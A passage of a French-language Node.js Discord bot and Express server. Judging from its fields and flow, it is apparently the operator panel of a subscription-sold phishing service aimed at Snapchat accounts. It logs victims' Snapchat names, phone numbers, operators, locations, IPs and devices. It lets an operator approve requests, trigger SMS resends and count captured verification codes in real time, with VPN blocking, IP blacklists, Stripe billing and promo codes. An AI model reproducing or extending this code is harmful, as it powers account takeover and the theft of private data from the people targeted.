            blacklist.add(ip); saveBlacklist(blacklist);
            return interaction.reply({ content: `🚫 IP \`${ip}\` ajoutée à la blacklist.`, ephemeral: true });
        }
        if (sub === 'remove') {
            const ip = interaction.options.getString('ip');
            blacklist.delete(ip); saveBlacklist(blacklist);
            return interaction.reply({ content: `✅ IP \`${ip}\` retirée de la blacklist.`, ephemeral: true });
        }
        if (sub === 'list') {
            const list = [...blacklist];
            if (list.length === 0) return interaction.reply({ content: '✅ Aucune IP blacklistée.', ephemeral: true });
            return interaction.reply({
                embeds: [new EmbedBuilder()
                    .setTitle(`🚫 Blacklist (${list.length} IPs)`)
                    .setColor(0xFF4444)
                    .setDescription(list.map(ip => `\`${ip}\``).join('\n'))
                    .setTimestamp()
                ],
                ephemeral: true
            });
        }
    }

    // /clear — OWNER ONLY
    if (interaction.commandName === 'clear') {
        if (!isOwner(interaction.user.id)) {
            return interaction.reply({ content: '🚫 Tu n\'as pas accès à cette commande.', ephemeral: true });
        }
        const pending = [...requests.entries()].filter(([, r]) => !r.approved && !r.rejected);
        if (pending.length === 0) {
            return interaction.reply({ content: '✅ Aucune demande en attente.', ephemeral: true });
        }
        for (const [id, r] of pending) {
            r.rejected = true;
        }
        saveRequests(requests);
        // Mettre à jour le statut historique
        for (const entry of history) {
            if (pending.find(([id]) => id === entry.id)) entry.status = 'cleared';
        }
        saveHistory(history);
        return interaction.reply({
            content: `🗑️ **${pending.length} demande(s)** en attente vidées.`,
            ephemeral: true
        });
    }

    // /history — OWNER ONLY
    if (interaction.commandName === 'history') {
        if (!isOwner(interaction.user.id)) {
            return interaction.reply({ content: '🚫 Tu n\'as pas accès à cette commande.', ephemeral: true });
        }
        const last10 = history.slice(0, 10);
        if (last10.length === 0) {
            return interaction.reply({ content: '📭 Aucune demande dans l\'historique.', ephemeral: true });
        }
        const statusEmoji = { pending: '⏳', approved: '✅', rejected: '❌', cleared: '🗑️' };
        const lines = last10.map((e, i) => {
            const date = new Date(e.createdAt).toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });
            const emoji = statusEmoji[e.status] || '❓';
            return `${emoji} **${e.snapchat}** | ${e.phone} | ${e.operator} | \`${date}\``;
        });
        return interaction.reply({
            embeds: [new EmbedBuilder()
                .setTitle('📋 10 dernières demandes')
                .setColor(0xFFFC00)
                .setDescription(lines.join('\n'))
                .setTimestamp()
            ],
            ephemeral: true
        });
    }

    // /config — OWNER ONLY
    if (interaction.commandName === 'config') {
        if (!isOwner(interaction.user.id)) {
            return interaction.reply({ content: '🚫 Tu n\'as pas accès à cette commande.', ephemeral: true });
        }

        const sub = interaction.options.getSubcommand();

        // /config show
        if (sub === 'show') {
            const on  = '🟢 Activé';
            const off = '🔴 Désactivé';
            return interaction.reply({
                embeds: [new EmbedBuilder()
                    .setTitle('⚙️ Configuration actuelle')
                    .setColor(0xFFFC00)
                    .addFields(
                        { name: '🌐 Site actif',            value: cfg.site_actif          ? on : off,                    inline: true },
                        { name: '🔒 Rate limiting',         value: cfg.ratelimit_actif     ? `${on} (${cfg.ratelimit_minutes} min)` : off, inline: true },
                        { name: '🌍 Afficher IP',           value: cfg.afficher_ip         ? on : off,                    inline: true },
                        { name: '📱 Afficher appareil/OS',  value: cfg.afficher_appareil   ? on : off,                    inline: true },
                        { name: '👁️ Salon prioritaire',     value: cfg.salon_prioritaire   ? on : off,                    inline: true },
                        { name: '⏱️ Délai Discord',         value: `${cfg.delai_discord_sec}s`,                           inline: true },
                        { name: '⏰ Timeout demandes',      value: `${cfg.timeout_minutes} min`,                          inline: true },
                        { name: '🔗 Webhook fallback',      value: cfg.webhook_fallback    ? on : off,                    inline: true },
                        { name: '🛡️ Bloquer VPN',          value: cfg.bloquer_vpn         ? on : off,                    inline: true },
                    )
                    .setFooter({ text: 'Utilise /config set <parametre> <valeur> pour modifier' })
                    .setTimestamp()
                ],
                ephemeral: true
            });
        }

        // /config set
        if (sub === 'set') {
            const param = interaction.options.getString('parametre');
            const valStr = interaction.options.getString('valeur');

            const boolParams = ['site_actif','ratelimit_actif','afficher_ip','afficher_appareil','salon_prioritaire','webhook_fallback','bloquer_vpn'];
            const intParams  = { ratelimit_minutes: [1,60], timeout_minutes: [1,30], delai_discord_sec: [1,60] };

            if (boolParams.includes(param)) {
                if (!['true','false','1','0','oui','non'].includes(valStr.toLowerCase())) {
                    return interaction.reply({ content: `❌ Valeur invalide. Utilise \`true\` ou \`false\`.`, ephemeral: true });
                }
                cfg[param] = ['true','1','oui'].includes(valStr.toLowerCase());
                saveConfig(cfg);
                updateBotStatus();
                return interaction.reply({
                    content: `✅ **${param}** → \`${cfg[param] ? 'activé' : 'désactivé'}\``,
                    ephemeral: true
                });
            }

            if (intParams[param]) {
                const [min, max] = intParams[param];
                const val = parseInt(valStr);
                if (isNaN(val) || val < min || val > max) {
                    return interaction.reply({ content: `❌ Valeur invalide. Doit être entre ${min} et ${max}.`, ephemeral: true });
                }
                cfg[param] = val;
                saveConfig(cfg);
                return interaction.reply({
                    content: `✅ **${param}** → \`${val}\``,
                    ephemeral: true
                });
            }

            return interaction.reply({ content: `❌ Paramètre inconnu : \`${param}\``, ephemeral: true });
        }

        // /config reset
        if (sub === 'reset') {
            cfg = { ...CONFIG_DEFAULTS };
            saveConfig(cfg);
            updateBotStatus();
            return interaction.reply({ content: '♻️ Configuration réinitialisée aux valeurs par défaut.', ephemeral: true });
        }
    }
});

// --- Interactions Discord (boutons) ---
client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;
    const parts = interaction.customId.split('_');
    const action = parts[0];
    const requestId = parts.slice(1).join('_');

    if (!['approve', 'reject', 'resend'].includes(action)) return;

    const request = requests.get(requestId);
    if (!request) return interaction.reply({ content: 'Demande introuvable ou expirée.', ephemeral: true });

    if (action === 'resend') {
        request.resend = true;
        saveRequests(requests);
        return interaction.reply({ content: `📲 Signal "Renvoyer SMS" envoyé à ${request.snapchat}.`, ephemeral: true });
    }

    if (request.approved || request.rejected) {
        return interaction.reply({ content: 'Déjà traitée.', ephemeral: true });
    }

    if (action === 'approve') {
        request.approved = true;
        saveRequests(requests);
        statsToday.approved++;
        updateBotStatus();
        await interaction.reply({ content: `✅ Demande acceptée pour ${request.snapchat}.`, ephemeral: true });
        // DM owner si activé
        if (cfg.dm_notifs !== false) {
            try {
                const owner = await client.users.fetch(OWNER_ID);
                await owner.send({ embeds: [new EmbedBuilder()
                    .setTitle('✅ Demande acceptée')
                    .setColor(0x00FF6A)
                    .addFields(
                        { name: '👻 Snap', value: request.snapchat, inline: true },
                        { name: '📱 Téléphone', value: request.phone || '?', inline: true },
                        { name: '🌍 Localisation', value: request.geo || '?', inline: false }
                    )
                    .setFooter({ text: `ID: ${requestId}` })
                    .setTimestamp()
                ]});
            } catch(e) {}
        }
    } else {
        request.rejected = true;
        saveRequests(requests);
        statsToday.rejected++;
        updateBotStatus();
        await interaction.reply({ content: `❌ Demande refusée pour ${request.snapchat}.`, ephemeral: true });
        // DM owner si activé
        if (cfg.dm_notifs !== false) {
            try {
                const owner = await client.users.fetch(OWNER_ID);
                await owner.send({ embeds: [new EmbedBuilder()
                    .setTitle('❌ Demande refusée')
                    .setColor(0xFF4444)
                    .addFields(
                        { name: '👻 Snap', value: request.snapchat, inline: true },
                        { name: '📱 Téléphone', value: request.phone || '?', inline: true }
                    )
                    .setFooter({ text: `ID: ${requestId}` })
                    .setTimestamp()
                ]});
            } catch(e) {}
        }
    }

    // Désactiver les boutons du message
    try {
        const disabledRow = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder().setCustomId(`approve_${requestId}`).setLabel('✅ Accepter').setStyle(ButtonStyle.Success).setDisabled(true),
                new ButtonBuilder().setCustomId(`reject_${requestId}`).setLabel('❌ Refuser').setStyle(ButtonStyle.Danger).setDisabled(true),
                new ButtonBuilder().setCustomId(`resend_${requestId}`).setLabel('📲 Renvoyer SMS').setStyle(ButtonStyle.Secondary).setDisabled(true)
            );
        await interaction.message.edit({ components: [disabledRow] });
    } catch (e) {
        console.error('Erreur désactivation boutons:', e.message);
    }
});

// ================== DISCORD OAUTH2 ==================

// Redirige vers Discord OAuth2
app.get('/login', (req, res) => {
    if (!DISCORD_CLIENT_ID) {
        return res.status(503).send('<h2>DISCORD_CLIENT_ID manquant dans .env</h2>');
    }
    const params = new URLSearchParams({
        client_id:     DISCORD_CLIENT_ID,
        redirect_uri:  `${BASE_URL}/auth/callback`,
        response_type: 'code',
        scope:         'identify'
    });
    res.redirect(`https://discord.com/api/oauth2/authorize?${params}`);
});

// Callback après autorisation Discord
app.get('/auth/callback', async (req, res) => {
    const { code } = req.query;
    if (!code) return res.redirect('/login');
    if (!DISCORD_CLIENT_ID || !DISCORD_CLIENT_SECRET) {
        return res.status(503).send('<h2>OAuth2 non configuré (DISCORD_CLIENT_ID / DISCORD_CLIENT_SECRET manquants)</h2>');
    }
    try {
        const tokenRes = await axios.post(
            'https://discord.com/api/oauth2/token',
            new URLSearchParams({
                client_id:     DISCORD_CLIENT_ID,
                client_secret: DISCORD_CLIENT_SECRET,
                grant_type:    'authorization_code',
                code,
                redirect_uri:  `${BASE_URL}/auth/callback`
            }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );
        const userRes = await axios.get('https://discord.com/api/users/@me', {
            headers: { Authorization: `Bearer ${tokenRes.data.access_token}` }
        });
        req.session.user = {
            id:            userRes.data.id,
            username:      userRes.data.username,
            avatar:        userRes.data.avatar,
            discriminator: userRes.data.discriminator || '0'
        };
        res.redirect('/dashboard');
    } catch (e) {
        console.error('OAuth error:', e.response?.data || e.message);
        res.redirect('/login?error=1');
    }
});

// Déconnexion
app.get('/logout', (req, res) => {
    req.session.destroy(() => res.redirect('/'));
});

// Dashboard (page HTML protégée)
app.get('/dashboard', requireAuth, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// ================== API DASHBOARD ==================

// Profil utilisateur connecté
app.get('/api/me', requireAuth, (req, res) => {
    const u = req.session.user;
    const avatarUrl = u.avatar
        ? `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png`
        : `https://cdn.discordapp.com/embed/avatars/${parseInt(u.discriminator || '0') % 5}.png`;
    res.json({
        id:        u.id,
        username:  u.username,
        avatarUrl,
        isPremium: hasSubscription(u.id),
        isOwner:   isOwner(u.id)
    });
});

// Config publique du site (utilisée par index.html pour personnaliser les textes)
app.get('/api/site-config', (req, res) => {
    const keys = [
        'site_titre','site_sous_titre','site_description',
        'site_stat_actif','site_badge','site_btn_text',
        'site_attente_titre','site_attente_texte',
        'site_code_titre','site_code_desc','site_succes_msg'
    ];
    const out = {};
    for (const k of keys) out[k] = cfg[k] ?? CONFIG_DEFAULTS[k];
    res.json(out);
});

// Config complète (premium)
app.get('/api/dashboard/config', requireAuth, (req, res) => {
    if (!hasSubscription(req.session.user.id)) return res.status(403).json({ error: 'premium_required' });
    res.json(cfg);
});

app.post('/api/dashboard/config', requireAuth, (req, res) => {
    if (!hasSubscription(req.session.user.id)) return res.status(403).json({ error: 'premium_required' });
    const defaults = CONFIG_DEFAULTS;
    for (const key of Object.keys(defaults)) {
        if (!(key in req.body)) continue;
        const raw = req.body[key];
        if (typeof defaults[key] === 'boolean') cfg[key] = raw === true || raw === 'true' || raw === 1 || raw === '1';
        else if (typeof defaults[key] === 'number')  cfg[key] = parseFloat(raw) || defaults[key];
        else cfg[key] = String(raw);
    }
    saveConfig(cfg);
    updateBotStatus();
    res.json({ ok: true, cfg });
});

// Stats (premium)
app.get('/api/dashboard/stats', requireAuth, (req, res) => {
    if (!hasSubscription(req.session.user.id)) return res.status(403).json({ error: 'premium_required' });
    resetStatsIfNewDay();
    const pending = [...requests.values()].filter(r => !r.approved && !r.rejected).length;
    res.json({ ...statsToday, pending, history: history.slice(0, 20) });
});

// Demandes en attente (premium)
app.get('/api/dashboard/requests', requireAuth, (req, res) => {
    if (!hasSubscription(req.session.user.id)) return res.status(403).json({ error: 'premium_required' });
    const list = [...requests.entries()]
        .filter(([, r]) => !r.approved && !r.rejected)
        .map(([id, r]) => ({ id, ...r }))
        .sort((a, b) => b.createdAt - a.createdAt);
    res.json(list);
});

// Blacklist (premium)
app.get('/api/dashboard/blacklist', requireAuth, (req, res) => {
    if (!hasSubscription(req.session.user.id)) return res.status(403).json({ error: 'premium_required' });
    res.json([...blacklist]);
});
app.post('/api/dashboard/blacklist/add', requireAuth, (req, res) => {
    if (!hasSubscription(req.session.user.id)) return res.status(403).json({ error: 'premium_required' });
    const { ip } = req.body;
    if (!ip) return res.status(400).json({ error: 'IP manquante' });
    blacklist.add(ip.trim()); saveBlacklist(blacklist);
    res.json({ ok: true });
});
app.post('/api/dashboard/blacklist/remove', requireAuth, (req, res) => {
    if (!hasSubscription(req.session.user.id)) return res.status(403).json({ error: 'premium_required' });
    const { ip } = req.body;
    blacklist.delete(ip); saveBlacklist(blacklist);
    res.json({ ok: true });
});

// Détail d'un serveur (owner only)
app.get('/api/dashboard/guilds/:id', requireAuth, (req, res) => {
    if (!isOwner(req.session.user.id)) return res.status(403).json({ error: 'owner_only' });
    if (!botReady) return res.status(503).json({ error: 'bot_not_ready' });
    const guild = client.guilds.cache.get(req.params.id);
    if (!guild) return res.status(404).json({ error: 'Serveur introuvable' });

    const channels = [...guild.channels.cache.values()]
        .map(c => ({ id: c.id, name: c.name, type: c.type, position: c.rawPosition, parentId: c.parentId || null }))
        .sort((a, b) => a.position - b.position);

    res.json({
        id: guild.id, name: guild.name,
        icon: guild.iconURL({ size: 128 }) || null,
        memberCount: guild.memberCount,
        ownerId: guild.ownerId,
        ownerSub: getSubType(guild.ownerId),
        hasPremium: hasGuildPremium(guild.id),
        createdAt: guild.createdTimestamp,
        channels
    });
});

// Grant / revoke premium sur un serveur (owner only)
app.post('/api/dashboard/guilds/:id/premium', requireAuth, (req, res) => {
    if (!isOwner(req.session.user.id)) return res.status(403).json({ error: 'owner_only' });
    const guildId = req.params.id;
    const { grant } = req.body;
    if (!cfg.guild_premiums) cfg.guild_premiums = {};
    if (grant) {
        cfg.guild_premiums[guildId] = { grantedAt: Date.now() };
    } else {
        delete cfg.guild_premiums[guildId];
    }
    saveConfig(cfg);
    res.json({ ok: true, hasPremium: !!cfg.guild_premiums[guildId] });
});

// Analytics (owner only)
app.get('/api/dashboard/analytics', requireAuth, (req, res) => {
    if (!isOwner(req.session.user.id)) return res.status(403).json({ error: 'owner_only' });
    const now = Date.now();
    const last24h = now - 24 * 60 * 60 * 1000;

    const hourly = new Array(24).fill(0);
    const countries = {};
    let approved = 0, rejected = 0, pending = 0;

    for (const r of requests.values()) {
        if (r.createdAt > last24h) {
            const h = new Date(r.createdAt).getHours();
            hourly[h]++;
        }
        if (r.approved) approved++;
        else if (r.rejected) rejected++;
        else pending++;

        // geo format: "🇫🇷 Paris, France" → on prend le dernier segment
        if (r.geo && r.geo !== '?') {
            const parts = r.geo.split(', ');
            const country = parts[parts.length - 1];
            countries[country] = (countries[country] || 0) + 1;
        }
    }

    const topCountries = Object.entries(countries)
        .sort((a, b) => b[1] - a[1])
        .slice(0, 8);

    resetStatsIfNewDay();
    res.json({ hourly, topCountries, totals: { approved, rejected, pending, total: requests.size }, statsToday });
});

// ================== STRIPE ==================

// Créer une session de paiement Stripe Checkout
app.post('/api/create-checkout', requireAuth, async (req, res) => {
    if (!stripe) return res.status(503).json({ error: 'Stripe non configuré. Ajoute STRIPE_SECRET_KEY dans .env et lance : npm install stripe' });
    if (!process.env.STRIPE_PRICE_ID) return res.status(503).json({ error: 'STRIPE_PRICE_ID manquant dans .env' });
    const u = req.session.user;
    try {
        const sess = await stripe.checkout.sessions.create({
            payment_method_types: ['card'],
            mode:         'subscription',
            line_items:   [{ price: process.env.STRIPE_PRICE_ID, quantity: 1 }],
            success_url:  `${BASE_URL}/dashboard?success=1`,
            cancel_url:   `${BASE_URL}/dashboard?cancelled=1`,
            metadata:     { discordId: u.id, discordUsername: u.username },
            locale:       'fr'
        });
        res.json({ url: sess.url });
    } catch (e) {
        console.error('Stripe checkout error:', e.message);
        res.status(500).json({ error: e.message });
    }
});

// Webhook Stripe (events de paiement/annulation)
app.post('/api/stripe/webhook', (req, res) => {
    if (!stripe) return res.sendStatus(200);
    const sig = req.headers['stripe-signature'];
    if (!process.env.STRIPE_WEBHOOK_SECRET) {
        console.warn('STRIPE_WEBHOOK_SECRET manquant — webhook non vérifié');
        return res.sendStatus(200);
    }
    let event;
    try {
        event = stripe.webhooks.constructEvent(req.body, sig, process.env.STRIPE_WEBHOOK_SECRET);
    } catch (e) {
        console.error('Stripe webhook signature error:', e.message);
        return res.status(400).send(`Webhook Error: ${e.message}`);
    }

    if (event.type === 'checkout.session.completed') {
        const sess     = event.data.object;
        const discordId = sess.metadata?.discordId;
        if (discordId) {
            subs[discordId] = {
                active:           true,
                stripeCustomerId: sess.customer,
                stripeSubId:      sess.subscription,
                startedAt:        Date.now()
            };
            saveSubs(subs);
            console.log(`✅ Premium activé — Discord: ${discordId}`);
        }
    }

    if (event.type === 'customer.subscription.deleted' || event.type === 'customer.subscription.paused') {
        const sub   = event.data.object;
        const entry = Object.entries(subs).find(([, v]) => v.stripeCustomerId === sub.customer);
        if (entry) {
            subs[entry[0]].active = false;
            saveSubs(subs);
            console.log(`❌ Premium désactivé — Discord: ${entry[0]}`);
        }
    }

    res.sendStatus(200);
});

// ================== SERVEURS DISCORD ==================
app.get('/api/dashboard/guilds', requireAuth, (req, res) => {
    if (!hasSubscription(req.session.user.id)) return res.status(403).json({ error: 'premium_required' });
    if (!botReady) return res.json([]);
    const guilds = [...client.guilds.cache.values()].map(g => ({
        id: g.id,
        name: g.name,
        memberCount: g.memberCount,
        icon: g.iconURL({ size: 64 }) || null,
        premium: hasGuildPremium(g.id)
    }));
    res.json(guilds);
});

// ================== CODES PROMO ==================
// Générer un code (owner only)
app.post('/api/generate-promo', requireAuth, (req, res) => {
    if (!isOwner(req.session.user.id)) return res.status(403).json({ error: 'owner_only' });
    const { maxUses = 1, durationDays = 30 } = req.body;
    const code = 'SNAP-' + Math.random().toString(36).slice(2, 8).toUpperCase();
    promos[code] = {
        code,
        createdAt: Date.now(),
        maxUses: parseInt(maxUses) || 1,
        durationDays: parseInt(durationDays) || 30,
        usedBy: []
    };
    savePromos(promos);
    res.json({ ok: true, code });
});

// Lister les codes (owner only)
app.get('/api/dashboard/promos', requireAuth, (req, res) => {
    if (!isOwner(req.session.user.id)) return res.status(403).json({ error: 'owner_only' });
    res.json(Object.values(promos));
});

// Supprimer un code (owner only)
app.delete('/api/dashboard/promos/:code', requireAuth, (req, res) => {
    if (!isOwner(req.session.user.id)) return res.status(403).json({ error: 'owner_only' });
    delete promos[req.params.code];
    savePromos(promos);
    res.json({ ok: true });
});

// Utiliser un code promo
app.post('/api/redeem-promo', requireAuth, (req, res) => {
    const { code } = req.body;
    if (!code) return res.status(400).json({ error: 'Code manquant' });
    const promo = promos[code.trim().toUpperCase()];
    if (!promo) return res.status(400).json({ error: 'Code invalide ou inexistant.' });
    if (promo.usedBy.length >= promo.maxUses) return res.status(400).json({ error: 'Ce code a déjà été utilisé le nombre maximum de fois.' });
    const userId = req.session.user.id;
    if (promo.usedBy.includes(userId)) return res.status(400).json({ error: 'Tu as déjà utilisé ce code.' });

    promo.usedBy.push(userId);
    savePromos(promos);

    const expiresAt = Date.now() + promo.durationDays * 24 * 60 * 60 * 1000;
    subs[userId] = { active: true, startedAt: Date.now(), expiresAt, promoCode: code };
    saveSubs(subs);

    // Met à jour la session
    req.session.user._premiumRefresh = Date.now();

    res.json({ ok: true, expiresAt, durationDays: promo.durationDays });
});

// Page 404 custom
app.use((req, res) => {
    res.status(404).send(`<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="refresh" content="3;url=/">
  <title>Page introuvable</title>
  <style>
    body { background:#000; color:#fff; font-family:sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; }
    h1 { font-size:60px; color:#FFFC00; margin:0; }
    p { color:#888; margin-top:12px; }
  </style>
</head>
<body>
  <h1>404</h1>
  <p>Page introuvable — redirection en cours...</p>
</body>
</html>`);
});

// ================== STATUS EMBED LIVE ==================
async function updateStatusEmbed() {
    if (!botReady || !cfg.status_channel_id) return;
    try {
        const channel = client.channels.cache.get(cfg.status_channel_id);
        if (!channel) return;

        resetStatsIfNewDay();
        const pending = [...requests.values()].filter(r => !r.approved && !r.rejected).length;
        const ping    = client.ws.ping;

        // Contrôle du bot : toujours géré par l'owner via le dashboard
        const guild = client.guilds.cache.get(channel.guildId);
        let subInfo = '👑 Owner';
        if (guild && hasGuildPremium(guild.id)) subInfo = '💎 Premium accordé';

        const embed = new EmbedBuilder()
            .setTitle('📡 Status — Live')
            .setColor(cfg.site_actif ? 0x00FF6A : 0xFF4444)
            .addFields(
                { name: '🌐 Site',         value: cfg.site_actif ? '🟢 Actif' : '🔴 Désactivé',  inline: true },
                { name: '🤖 Bot',          value: `🟢 En ligne (${ping > 0 ? ping : '~'}ms)`,    inline: true },
                { name: '💎 Abonnement',   value: subInfo,                                         inline: true },
                { name: '📊 Stats du jour', value: [
                    `📥 Demandes : **${statsToday.total}**`,
                    `✅ Acceptées : **${statsToday.approved}**`,
                    `❌ Refusées  : **${statsToday.rejected}**`,
                    `🔐 Codes     : **${statsToday.codes}**`,
                    `⏳ En attente : **${pending}**`,
                ].join('\n'), inline: false },
            )
            .setFooter({ text: 'Mise à jour automatique toutes les 60s' })
            .setTimestamp();

        // Essaie d'éditer le message existant
        if (cfg.status_message_id) {
            try {
                const msg = await channel.messages.fetch(cfg.status_message_id);
                await msg.edit({ embeds: [embed] });
                return;
            } catch(e) {
                // Message supprimé — on en crée un nouveau
                cfg.status_message_id = '';
            }
        }

        // Nouveau message
        const msg = await channel.send({ embeds: [embed] });
        cfg.status_message_id = msg.id;
        saveConfig(cfg);
        console.log(`📡 Status embed posté dans #${channel.name}`);
    } catch(e) {
        console.error('Erreur status embed:', e.message);
    }
}

// --- Démarrage ---
client.once('ready', async () => {
    console.log(`🤖 Bot Discord connecté en tant que ${client.user.tag}`);
    botReady = true;

    // Enregistrer les slash commands
    try {
        const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_BOT_TOKEN);

        const configParams = [
            'site_actif','ratelimit_actif','afficher_ip','afficher_appareil',
            'salon_prioritaire','webhook_fallback',
            'ratelimit_minutes','timeout_minutes','delai_discord_sec'
        ];

        const commandBody = [
                new SlashCommandBuilder()
                    .setName('dashboard')
                    .setDescription('🖥️ Accéder au dashboard web [OWNER ONLY]')
                    .toJSON(),

                new SlashCommandBuilder()
                    .setName('setstatus')
                    .setDescription('📡 Configurer le canal de status live dans ce salon [OWNER ONLY]')
                    .toJSON(),

                new SlashCommandBuilder()
                    .setName('abonnement')
                    .setDescription('💎 Voir le statut de ton abonnement')
                    .toJSON(),

                new SlashCommandBuilder()
                    .setName('forfaits')
                    .setDescription('💰 Voir les forfaits et tarifs disponibles')
                    .toJSON(),

                new SlashCommandBuilder()
                    .setName('stats')
                    .setDescription('📊 Voir les stats du jour [PREMIUM]')
                    .toJSON(),

                new SlashCommandBuilder()
                    .setName('clear')
                    .setDescription('🗑️ Vider toutes les demandes en attente [OWNER ONLY]')
                    .toJSON(),

                new SlashCommandBuilder()
                    .setName('history')
                    .setDescription('📋 Voir les 10 dernières demandes [OWNER ONLY]')
                    .toJSON(),

                new SlashCommandBuilder()
                    .setName('pause')
                    .setDescription('⏸️ Désactiver le site immédiatement [OWNER ONLY]')
                    .toJSON(),

                new SlashCommandBuilder()
                    .setName('resume')
                    .setDescription('▶️ Réactiver le site [OWNER ONLY]')
                    .toJSON(),

                new SlashCommandBuilder()
                    .setName('pending')
                    .setDescription('⏳ Voir les demandes en attente avec timing [OWNER ONLY]')
                    .toJSON(),

                new SlashCommandBuilder()
                    .setName('blacklist')
                    .setDescription('🚫 Gérer la blacklist d\'IPs [OWNER ONLY]')
                    .addSubcommand(s => s.setName('add').setDescription('Ajouter une IP')
                        .addStringOption(o => o.setName('ip').setDescription('Adresse IP').setRequired(true)))
                    .addSubcommand(s => s.setName('remove').setDescription('Retirer une IP')
                        .addStringOption(o => o.setName('ip').setDescription('Adresse IP').setRequired(true)))
                    .addSubcommand(s => s.setName('list').setDescription('Voir la blacklist'))
                    .toJSON(),

                new SlashCommandBuilder()
                    .setName('config')
                    .setDescription('⚙️ Gérer les paramètres du site/bot [OWNER ONLY]')
                    .addSubcommand(sub => sub
                        .setName('show')
                        .setDescription('Voir la configuration actuelle')
                    )
                    .addSubcommand(sub => sub
                        .setName('set')
                        .setDescription('Modifier un paramètre')
                        .addStringOption(opt => opt
                            .setName('parametre')
                            .setDescription('Paramètre à modifier')
                            .setRequired(true)
                            .addChoices(
                                { name: '🌐 Site actif (true/false)',           value: 'site_actif' },
                                { name: '🔒 Rate limiting actif (true/false)',  value: 'ratelimit_actif' },
                                { name: '⏱️ Durée rate limit (minutes, 1-60)',  value: 'ratelimit_minutes' },
                                { name: '🌍 Afficher IP (true/false)',           value: 'afficher_ip' },
                                { name: '📱 Afficher appareil/OS (true/false)', value: 'afficher_appareil' },
                                { name: '👁️ Salon prioritaire (true/false)',    value: 'salon_prioritaire' },
                                { name: '⏱️ Délai Discord (secondes, 1-60)',    value: 'delai_discord_sec' },
                                { name: '⏰ Timeout demandes (minutes, 1-30)', value: 'timeout_minutes' },
                                { name: '🔗 Webhook fallback (true/false)',     value: 'webhook_fallback' },
                                { name: '🛡️ Bloquer VPN/proxy (true/false)',   value: 'bloquer_vpn' },
                            )
                        )
                        .addStringOption(opt => opt
                            .setName('valeur')
                            .setDescription('Nouvelle valeur (true/false ou nombre)')
                            .setRequired(true)
                        )
                    )
                    .addSubcommand(sub => sub
                        .setName('reset')
                        .setDescription('Remettre tous les paramètres par défaut')
                    )
                    .toJSON(),
        ];

        // Supprimer les anciennes global commands (évite les doublons)
        await rest.put(Routes.applicationCommands(client.user.id), { body: [] });

        // Enregistrer uniquement en guild commands (apparaissent immédiatement, pas de doublon)
        let registeredCount = 0;
        for (const [guildId] of client.guilds.cache) {
            try {
                await rest.put(Routes.applicationGuildCommands(client.user.id, guildId), { body: commandBody });
                registeredCount++;
            } catch(e) {
                console.warn(`⚠️ Commands non enregistrées dans ${guildId}: ${e.message}`);
            }
        }
        console.log(`✅ Slash commands enregistrées dans ${registeredCount} serveur(s) (/dashboard, /setstatus, /stats, /config, /clear, /history, /pause, /resume, /pending, /blacklist)`);
    } catch (e) {
        console.error('Erreur enregistrement slash commands:', e.message);
    }

    // Statut initial
    updateBotStatus();

    // Status embed auto-update (toutes les 60s)
    setInterval(updateStatusEmbed, 60 * 1000);
    if (cfg.status_channel_id) updateStatusEmbed(); // 1ère mise à jour au démarrage

    // Vider la file d'attente
    while (pendingMessages.length > 0) {
        const fn = pendingMessages.shift();
        try { await fn(); } catch (e) { console.error('Erreur file attente:', e.message); }
    }
});

client.login(process.env.DISCORD_BOT_TOKEN);

app.listen(PORT, () => {
    console.log(`🚀 Serveur web lancé sur ${BASE_URL}`);
});
